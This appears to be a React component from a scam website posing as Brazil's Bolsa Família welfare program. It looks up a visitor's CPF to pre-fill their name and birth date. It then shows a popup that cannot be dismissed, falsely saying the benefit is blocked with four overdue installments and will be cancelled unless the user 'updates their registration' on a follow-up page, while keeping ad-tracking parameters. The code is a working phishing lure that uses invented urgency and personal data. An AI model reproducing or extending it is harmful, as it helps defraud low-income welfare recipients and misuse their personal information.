import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { Lock } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import cadeadoIcon from '@assets/cadeado-webp.webp';
import { useUserStore } from '../store/userStore';
import { consultarCpf } from '../services/cpfService';
import { preserveUrlParams } from '../lib/utmHandler';

interface PopupBolsaFamiliaProps {
  nome?: string;
  cpf?: string;
}

export function PopupBolsaFamilia({ nome, cpf }: PopupBolsaFamiliaProps) {
  const [isVisible, setIsVisible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [, navigate] = useLocation();
  const { setUserData } = useUserStore();

  // Efeito para buscar dados do CPF quando fornecido
  useEffect(() => {
    if (cpf) {
      const fetchUserData = async () => {
        setLoading(true);
        
        try {
          // Limpar o CPF (remover caracteres não numéricos)
          const numericCPF = cpf.replace(/\D/g, '');
          
          // Consultar a API
          const data = await consultarCpf(numericCPF);
          
          if (data) {
            // Salvar os dados do usuário no store
            setUserData({
              cpf: numericCPF,
              nome: data.nome || nome || '',
              nascimento: data.data_nascimento || '',
            });
          }
        } catch (error) {
          console.error('Erro ao buscar dados:', error);
        } finally {
          setLoading(false);
        }
      };
      
      fetchUserData();
    }
  }, [cpf, nome, setUserData]);
  
  // Mostrar o popup após 2 segundos
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsVisible(true);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const handleUpdateClick = () => {
    // Navegar para a página de parcelas do Bolsa Família, preservando os parâmetros UTM
    const urlWithParams = preserveUrlParams('/parcelas-bolsa-familia');
    navigate(urlWithParams);
  };

  return (
    <AnimatePresence>
      {isVisible && (
        <motion.div 
          className="fixed inset-0 flex items-center justify-center z-50 p-4"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 0.5 }}
        >
          {/* Overlay com fade in */}
          <motion.div 
            className="absolute inset-0 bg-black bg-opacity-50"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3 }}
            onClick={() => {}} // Captura cliques para impedir que fechem o modal
          />
          
          {/* Conteúdo do popup com animação */}
          <motion.div 
            className="bg-white rounded-xl shadow-lg max-w-md w-full mx-auto overflow-hidden relative z-10"
            initial={{ scale: 0.8, opacity: 0, y: 50 }}
            animate={{ scale: 1, opacity: 1, y: 0 }}
            transition={{ 
              type: "spring",
              damping: 15, 
              stiffness: 300,
              delay: 0.1,
              duration: 0.6
            }}
          >
            {/* Ícone centralizado com animação própria */}
            <motion.div 
              className="flex justify-center mt-6 mb-4"
              initial={{ scale: 0.5, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ delay: 0.3, duration: 0.5 }}
            >
              <div className="relative">
                <motion.img 
                  src={cadeadoIcon} 
                  alt="Chat com cadeado" 
                  className="w-28 h-28" 
                  initial={{ rotateY: 90 }}
                  animate={{ rotateY: 0 }}
                  transition={{ delay: 0.5, duration: 0.8, type: "spring" }}
                />
              </div>
            </motion.div>

            {/* Título com fade in */}
            <motion.h2 
              className="text-[#333] text-2xl font-bold text-center mb-2 px-4"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.6, duration: 0.5 }}
            >
              <span className="text-red-600">Benefício bloqueado!</span><br/>
              <span className="font-extrabold">Atualize o cadastro para receber.</span>
            </motion.h2>

            {/* Descrição com fade in */}
            <motion.p 
              className="text-[#666] text-center px-6 mb-4"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.7, duration: 0.5 }}
            >
              Seu benefício foi bloqueado e você precisa atualizar seus dados para liberar as parcelas do seu Bolsa Família.
            </motion.p>

            {/* Aviso Importante com animação de destaque */}
            <motion.div 
              className="mx-6 mb-4 bg-[#fff2f2] border border-[#ffe6e6] rounded-md p-3"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: 0.8, duration: 0.5 }}
              whileHover={{ scale: 1.02 }}
            >
              <p className="text-[#e05252] text-center text-sm">
                <span className="font-bold">AVISO IMPORTANTE:</span> Você possui 4 parcelas atrasadas que não recebeu! É necessário ATUALIZAR SEU CADASTRO para receber as parcelas, caso contrário, seu benefício será cancelado!
              </p>
            </motion.div>

            {/* Espaço antes do botão */}
            <div className="mb-6"></div>

            {/* Botão com destaque e animação */}
            <motion.div 
              className="px-6 pb-6"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.9, duration: 0.5 }}
            >
              <motion.button
                onClick={handleUpdateClick}
                className="w-full py-4 bg-[#ee8435] hover:bg-[#df7426] text-white font-medium rounded-md transition-colors"
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.98 }}
              >
                Atualizar meu cadastro agora
              </motion.button>
            </motion.div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}